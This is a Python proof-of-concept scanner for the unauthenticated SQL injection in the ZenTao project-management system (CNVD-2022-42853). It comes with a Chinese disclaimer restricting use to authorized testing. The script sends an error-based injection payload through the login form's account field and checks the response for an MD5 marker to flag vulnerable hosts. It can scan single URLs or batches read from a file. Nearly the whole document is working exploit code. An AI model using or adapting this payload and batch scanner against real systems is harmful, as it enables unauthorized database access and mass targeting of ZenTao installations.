'''
漏洞名称：禅道未授权SQL注入漏洞
漏洞编号：CNVD-2022-42853
影响范围：
禅道企业版 6.5
禅道旗舰版 3.0 8
禅道开源版 16.5
禅道开源版 16.5.beta1

author: colind0pe
github: https://github.com/colind0pe
免责声明：
- 仅限用于安全研究人员在授权的情况下使用，请遵守网络安全法，如您需要测试本工具的可用性，请自行搭建靶机环境。
- 严禁未经授权的渗透测试行为，在使用本工具过程中存在的任何非法行为，您需自行承担法律责任。
'''

import requests
import sys
import urllib3
import argparse

urllib3.disable_warnings()

def commit():
    try:
        description = "示例: python3 zentao_sqli_poc.py -u http://127.0.0.1/"
        parser = argparse.ArgumentParser(description=description)
        parser.add_argument('-u', '--url', type=str, help="Target URL", dest="url")
        parser.add_argument('-f', '--file', type=str, help="Targets File Path", dest="file")
        args = parser.parse_args()
        url = args.url
        file = args.file
        return url, file
    except Exception as e:
        print(e)
        sys.exit(0)


def target_url(url):
    target_url = url +"zentao/user-login.html"
    try:
        headers = {
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Referer': target_url,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36',
        }
        data = 'account=admin\'+and+(select+extractvalue(1,concat(0x7e,(MD5(49)),0x7e)))#'
        response = requests.post(target_url, headers=headers, data=data)
        if 'f457c545a9ded88f18ecee47145a72c' in response.text:
            print(target_url + " 存在禅道未授权SQL注入漏洞")
        else:
            pass
    except Exception as e:
        print(e)
        sys.exit(0)


def scans(file):
    try:
        with open(file,"r") as urls:
            for url in urls:
                if url[:4] != "http":
                    url = "http://" + url        
                url = url.strip()
                if url[-1] != "/":
                    url = url + "/"
                url = url.strip()
                target_url(url)
        urls.close()
    except Exception as e:
        print("[-] 文件不存在")


if __name__ == "__main__":
    try:
        url, file = commit()
        if url != '' and file == None:
            target_url(url)
        elif url == None and file != '':
            scans(file)
    except Exception as e:
        pass